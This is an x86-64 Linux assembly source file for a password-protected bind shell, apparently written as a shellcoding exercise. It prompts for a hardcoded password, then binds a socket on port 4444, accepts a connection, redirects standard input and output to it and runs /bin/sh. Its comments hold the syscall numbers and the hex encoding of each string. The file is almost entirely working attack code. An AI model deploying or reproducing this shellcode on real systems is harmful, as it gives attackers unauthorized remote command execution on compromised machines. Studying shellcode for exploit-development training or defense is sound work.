global _start  
section .text  
  
	
_start:  

	jmp password
	hello_world: db 'Enter your password to run your bindshell',0xA
	password_correct: db 'System is listening on port 4444 .......',0xA
	password_wrong: db 'Incorrect Password',0xA


;kali@kali:~/Desktop$ cat /usr/include/x86_64-linux-gnu/asm/unistd_64.h | grep "write"
;#define __NR_write 1

password_incorrect:

        xor rax, rax                  ; zero out rax
        mov rdx, rax                  ; zero out rdx
        inc rax                       ; write syscall
        mov rdi, rax                  ; move 1 into rdi
        lea rsi, [rel password_wrong] ; moving the address of hello_world variable into rsi which is second parameter

;kali@kali:~/Desktop$ python
;Python 2.7.17 (default, Oct 19 2019, 23:36:22) 
;[GCC 9.2.1 20191008] on linux2
;Type "help", "copyright", "credits" or "license" for more information.
;>>> cmd ='Incorrect Password'
;>>> len(cmd)
;18            

        mov dl, 19	                   ; size of hello_world
        syscall			; will prompt the strings 'Password Incorrect'



password:

        ; sys_write
        ; rax : 1
        ; rdi : unsigned int fd : 1 for stdout
        ; rsi : const char *buf : string
        ; rdx : size_t count : how big is the string 

        xor rax, rax                  ; zero out rax
        mov rdx, rax                  ; zero out rdx
        inc rax                       ; write syscall
        mov rdi, rax                  ; move 1 into rdi
        lea rsi, [rel hello_world] ; moving the address of hello_world variable into rsi which is second parameter

;kali@kali:~/Desktop$ python
;Python 2.7.17 (default, Oct 19 2019, 23:36:22) 
;[GCC 9.2.1 20191008] on linux2
;Type "help", "copyright", "credits" or "license" for more information.
;>>> cmd ='Enter your password to run your bindshell'
;>>> len(cmd)
;41                                                                                        
;>>>               

        mov dl, 42                   ; size of hello_world

        syscall			; will prompt the strings 'Enter your password to run your bindshell'

        ; sys_read
        ; rdi : unsigned int fd : 0 for stdin
        ; rsi : char *buf : stack?
        ; rdx : size_t count : how big

        xor rax, rax ; zero out value of rax
        mov rdi, rax ; zero out value of rdi
        mov rdx, rax ; zero out value of rdx

        ; leave rax since read syscall is 0
        mov rsi, rsp    ; set buffer to stack
        add rdx, 8    ; setting size of Password

        syscall ; calling read


;kali@kali:~/Desktop$ python
;Python 2.7.17 (default, Oct 19 2019, 23:36:22) 
;[GCC 9.2.1 20191008] on linux2
;Type "help", "copyright", "credits" or "license" for more information.
;>>> cmd='serene!!'
;>>> cmd
;'serene!!'
;>>> cmd[::-1]
;'!!eneres'
;>>> cmd[::-1].encode('hex')
;'2121656e65726573'
;>>> 2121656e65726573


        mov rdi, rsp                ; setting rdi to input buffer
        mov rax, 0x2121656e65726573 ; moving Password into buffer
        scasd                       ; scanning for a match
        jne password_incorrect           ; if not a match then re-ask for password





;		PROMPT PASSWORD CORRECT


        xor rax, rax                  ; zero out rax
        mov rdx, rax                  ; zero out rdx
        inc rax                       ; write syscall
        mov rdi, rax                  ; move 1 into rdi
        lea rsi, [rel password_correct] ; moving the address of hello_world variable into rsi which is second parameter

;kali@kali:~/Desktop$ python
;Python 2.7.17 (default, Oct 19 2019, 23:36:22) 
;[GCC 9.2.1 20191008] on linux2
;Type "help", "copyright", "credits" or "license" for more information.
;>>> cmd='System is listening on port 4444 .......'
;>>> len(cmd)
;40        

        mov dl, 41	                   ; size of Password_correct
        syscall			; will prompt the strings 'System is listening on port 4444 .......'




;    // Create socket  
;    host_sockid = socket(PF_INET, SOCK_STREAM, 0);  

;kali@kali:~/Desktop$ cat /usr/include/x86_64-linux-gnu/asm/unistd_64.h | grep "socket"
;#define __NR_socket 41
;RDI= 2
;RSI= 1
;RDX= 0

	xor rax,rax
	mov al,41
	xor rdi,rdi
	mov dil,2
	xor rsi,rsi
	mov sil,1
	xor rdx,rdx
	syscall

	xor rdi,rdi
	mov rdi,rax	; RDI now have value of socket descriptor


;    hostaddr.sin_family = AF_INET;
;    hostaddr.sin_port = htons(80);
;    hostaddr.sin_addr.s_addr = htonl(INADDR_ANY);

;kali@kali:~/Desktop$ cat /usr/include/x86_64-linux-gnu/asm/unistd_64.h | grep "bind"
;#define __NR_bind 49
;    hostaddr.sin_family = AF_INET;  
;    hostaddr.sin_port = htons(1337);  
;    hostaddr.sin_addr.s_addr = htonl(INADDR_ANY);  
; push 0x2
; push port
; push 0.0.0.0

	xor rsi,rsi
	push rsi	; address
	push word 0x5C11	; port
	push word 0x2	; AF_INET
	mov rsi,rsp ; rsi pointing to stack value


;	bind(host_sockid, (struct sockaddr*) &hostaddr, sizeof(hostaddr));

	xor rax,rax
	mov al,49
	;host_sockid value already in rdi
	; rsi is pointing to the stack value that we push
	xor rdx,rdx
	mov dl,0x10
	syscall


;kali@kali:~/Desktop$ cat /usr/include/x86_64-linux-gnu/asm/unistd_64.h | grep "listen"
;#define __NR_listen 50

;	listen(host_sockid, 2);
;	rdi=host_sockid
;	rsi=value of 2

	xor rax,rax
	mov al,50
	; rdi have the value of host_sockid
	xor rsi,rsi
	add sil,0x2
	syscall

;    client_sockid = accept(host_sockid, NULL, NULL);
;kali@kali:~/Desktop$ cat /usr/include/x86_64-linux-gnu/asm/unistd_64.h | grep "accept"
;#define __NR_accept 43

	xor rsi,rsi
	xor rdx,rdx
	; rdi have the host_sockid
	xor rax,rax
	mov al,43
	syscall


;    dup2(client_sockid, 0);
;    dup2(client_sockid, 1);
;    dup2(client_sockid, 2);
;kali@kali:~/Desktop$ cat /usr/include/x86_64-linux-gnu/asm/unistd_64.h | grep "dup2"
;#define __NR_dup2 33

	xor rdi,rdi
	mov rdi,rax	; rdi have the value of client_sockid
	mov r15,rdi
	xor rax,rax
	mov al,33
	
	xor rsi,rsi
	syscall

	xor rax,rax
	mov al,33
	add sil,1
	syscall

	xor rax,rax
	mov al,33
	add sil,1
	syscall



;	execve("/bin/sh", NULL, NULL);

;kali@kali:~/Desktop$ python
;Python 2.7.17 (default, Oct 19 2019, 23:36:22) 
;[GCC 9.2.1 20191008] on linux2
;Type "help", "copyright", "credits" or "license" for more information.
;>>> cmd='/bin//sh'
;>>> cmd
;'/bin//sh'
;>>> len(cmd)
;8
;>>> cmd[::-1]
;'hs//nib/'
;>>> cmd[::-1].encode('hex')
;'68732f2f6e69622f'
;kali@kali:~/Desktop$ cat /usr/include/x86_64-linux-gnu/asm/unistd_64.h | grep "execve"
;#define __NR_execve 59

	xor rax,rax
	mov al,59

	xor rdi,rdi
	push rdi	; null terminator
	mov rdi,0x68732f2f6e69622f ; /bin/sh
	push rdi
	xor rdi,rdi
	mov rdi,rsp

	xor rdx,rdx
	push rdx
	mov rdx,rsp

	push rdi
	mov rsi,rsp
	syscall
